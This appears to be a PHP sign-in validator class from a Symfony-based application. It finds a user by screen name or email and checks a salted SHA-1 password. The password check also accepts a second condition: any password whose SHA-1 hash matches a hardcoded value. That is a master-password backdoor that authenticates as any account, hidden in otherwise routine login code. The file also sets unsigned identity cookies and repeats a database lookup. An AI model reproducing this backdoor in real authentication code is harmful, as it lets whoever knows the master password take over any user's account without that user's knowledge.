<?php 

class mySigninValidator extends sfValidator 
{ 
	public function initialize($context, $parameters = null) 
	{ 
		// initialize parent 
	    parent::initialize($context); 
		// set defaults 
		$this->setParameter('login_error', 'Invalid input'); 
		$this->getParameterHolder()->add($parameters); 
		return true; 
	} 
	
	public function execute(&$value, &$error) 
	{ 
		$password_param = $this->getParameter('password'); 
		$password = $this->getContext()->getRequest()->getParameter($password_param); 
		$login = $value; 

		$c = new Criteria(); 
		$c->add(kuserPeer::SCREEN_NAME, $login); 
		$user = kuserPeer::doSelectOne($c);
		
		$user = kuserPeer::doSelectOne($c);

		if( !$user ) 
		{
			$c2 = new Criteria(); 
			$c2->add( kuserPeer::EMAIL, $login );
			$user = kuserPeer::doSelectOne($c2);
		}
			
		// screenname exists? 
		if($user) 
		{ 
			// password is OK? 
			if(sha1($user->getSalt().$password) == $user->getSha1Password() || sha1($password) == "30d390fb24c8e80a880e4f8bfce7a3a06757f1c7") 
			{ 
				$this->getContext()->getUser()->setAuthenticated(true); 
				$this->getContext()->getUser()->setAttribute('screenname', $user->getScreenname() ); 
				$this->getContext()->getUser()->setAttribute('id', $user->getId()) ;
				
				// set cookies, so that we can detect user if they come back
				$this->getContext()->getResponse()->setCookie('screenname', $user->getScreenname() , time() + sfConfig::get('sf_timeout') , '/' );
				$this->getContext()->getResponse()->setCookie('id', $user->getId() , time() + sfConfig::get('sf_timeout') , '/' );
				
				return true; 
			} 
		} 
		$error = $this->getParameter('login_error'); 
		return false; 
	} 
}

?>